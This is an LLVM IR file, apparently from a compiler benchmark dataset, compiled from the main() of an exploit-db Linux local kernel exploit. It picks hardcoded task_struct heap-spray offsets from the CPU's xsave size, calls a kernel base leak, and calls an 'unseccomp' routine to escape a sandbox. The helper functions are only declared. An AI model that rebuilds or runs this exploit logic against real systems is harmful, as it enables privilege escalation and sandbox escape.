; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43127.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43127.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stdout = common dso_local global i32 0, align 4
@_IONBF = common dso_local global i32 0, align 4
@thread_attr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i8] c"set stack size error\0A\00", align 1
@spray_offset = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [45 x i8] c"for spray assuming task struct size is 5952\0A\00", align 1
@.str.2 = private unnamed_addr constant [45 x i8] c"for spray assuming task struct size is 6208\0A\00", align 1
@.str.3 = private unnamed_addr constant [96 x i8] c"unknown xsave size... exiting since I don't know have the offsets hardcoded for that task save\0A\00", align 1
@.str.4 = private unnamed_addr constant [78 x i8] c"check in /sys/kernel/slab/task_struct/object_size to make sure this is right\0A\00", align 1
@.str.5 = private unnamed_addr constant [37 x i8] c"If it's wrong the exploit will fail\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  %8 = call i32 (...) @install_mock_chrome_sandbox()
  %9 = load i32, i32* @stdout, align 4
  %10 = load i32, i32* @_IONBF, align 4
  %11 = call i32 @setvbuf(i32 %9, i32* null, i32 %10, i32 0)
  %12 = call i32 @time(i32* null)
  %13 = call i32 @srand(i32 %12)
  %14 = call i32 @pthread_attr_init(i32* @thread_attr)
  %15 = call i64 @pthread_attr_setstacksize(i32* @thread_attr, i32 65536)
  %16 = icmp ne i64 %15, 0
  br i1 %16, label %17, label %19

17:                                               ; preds = %0
  %18 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %43

19:                                               ; preds = %0
  store i32 13, i32* %2, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %4, align 4
  store i32 0, i32* %3, align 4
  %20 = call i32 @native_cpuid(i32* %2, i32* %3, i32* %4, i32* %5)
  %21 = load i32, i32* %3, align 4
  store i32 %21, i32* %6, align 4
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 832
  br i1 %23, label %24, label %26

24:                                               ; preds = %19
  store i32 5627136, i32* @spray_offset, align 4
  %25 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  br label %34

26:                                               ; preds = %19
  %27 = load i32, i32* %6, align 4
  %28 = icmp eq i32 %27, 1088
  br i1 %28, label %29, label %31

29:                                               ; preds = %26
  store i32 5523648, i32* @spray_offset, align 4
  %30 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.2, i64 0, i64 0))
  br label %33

31:                                               ; preds = %26
  %32 = call i32 @printf(i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %43

33:                                               ; preds = %29
  br label %34

34:                                               ; preds = %33, %24
  %35 = call i32 @printf(i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.4, i64 0, i64 0))
  %36 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0))
  %37 = call i64 (...) @get_base()
  store i64 %37, i64* %7, align 8
  %38 = load i64, i64* %7, align 8
  %39 = icmp eq i64 %38, -1
  br i1 %39, label %40, label %41

40:                                               ; preds = %34
  store i32 -1, i32* %1, align 4
  br label %43

41:                                               ; preds = %34
  %42 = call i32 (...) @unseccomp()
  store i32 0, i32* %1, align 4
  br label %43

43:                                               ; preds = %41, %40, %31, %17
  %44 = load i32, i32* %1, align 4
  ret i32 %44
}

declare dso_local i32 @install_mock_chrome_sandbox(...) #1

declare dso_local i32 @setvbuf(i32, i32*, i32, i32) #1

declare dso_local i32 @srand(i32) #1

declare dso_local i32 @time(i32*) #1

declare dso_local i32 @pthread_attr_init(i32*) #1

declare dso_local i64 @pthread_attr_setstacksize(i32*, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @native_cpuid(i32*, i32*, i32*, i32*) #1

declare dso_local i64 @get_base(...) #1

declare dso_local i32 @unseccomp(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
